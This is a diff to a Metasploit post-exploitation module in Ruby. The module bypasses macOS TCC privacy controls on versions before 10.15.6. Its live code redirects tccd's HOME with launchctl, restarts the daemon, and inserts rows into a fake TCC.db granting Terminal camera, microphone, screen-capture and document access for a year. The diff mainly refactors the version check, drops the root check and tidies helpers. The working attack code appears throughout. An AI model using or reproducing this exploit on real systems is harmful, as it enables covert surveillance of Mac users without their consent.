@@ -38,21 +38,23 @@ class MetasploitModule < Msf::Post
   end
 
   def check
-    version = Gem::Version.new(get_system_version)
+    system_version = get_system_version
+    unless system_version
+      return Exploit::CheckCode::Unknown
+    end
+    version = Gem::Version.new(system_version)
     if version >= Gem::Version.new('10.15.6')
-      Exploit::CheckCode::Safe
+      return Exploit::CheckCode::Safe
+    elsif version < Gem::Version.new('10.15.0')
+      return Exploit::CheckCode::Unknown
     else
-      Exploit::CheckCode::Appears
+      return Exploit::CheckCode::Appears
     end
   end
 
   def run
     if check != Exploit::CheckCode::Appears
       fail_with Failure::NotVulnerable, 'Target is not vulnerable'
-    end
-
-    if is_root?
-      fail_with Failure::BadConfig, 'Session already has root privileges'
     end
 
     unless writable? datastore['WritableDir']
@@ -64,15 +66,14 @@ class MetasploitModule < Msf::Post
     tccdb = "#{tccdir}/TCC.db"
 
     print_status("Creating TCC directory #{tccdir}")
-    cmd_exec("mkdir -p '#{tccdir}'")
+    mkdir(tccdir)
     cmd_exec("launchctl setenv HOME '#{tmpdir}'")
     cmd_exec('launchctl stop com.apple.tccd && launchctl start com.apple.tccd')
-    if file_exist?(tccdb)
-      print_good("fake TCC DB found: #{tccdb}")
-    else
+    unless file_exist?(tccdb)
       print_error("No fake TCC DB found: #{tccdb}")
       fail_with Failure::NotVulnerable, 'Target is not vulnerable'
     end
+    print_good("fake TCC DB found: #{tccdb}")
 
     tcc_services = [
       'kTCCServiceCamera', 'kTCCServiceMicrophone', 'kTCCServiceAll', 'kTCCServiceScreenCapture', 'kTCCServiceSystemPolicyDocumentsFolder', 'kTCCService',
@@ -82,7 +83,7 @@ class MetasploitModule < Msf::Post
     bundle = 'com.apple.Terminal'
     csreq = 'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003'
     isfile = '0'
-    timestamp = (Time.now + (60 * 60 * 24 * 365)).to_i.to_s # 1 year from now
+    timestamp = 1.year.from_now.to_i.to_s
     for service in tcc_services
       sql_insert = "INSERT INTO access VALUES('#{service}', '#{bundle}', #{isfile}, 1, 1, X'#{csreq}', NULL, NULL, 'UNUSED', NULL, NULL, #{timestamp});"
       sqloutput = cmd_exec("sqlite3 '#{tccdb}' \"#{sql_insert}\"")
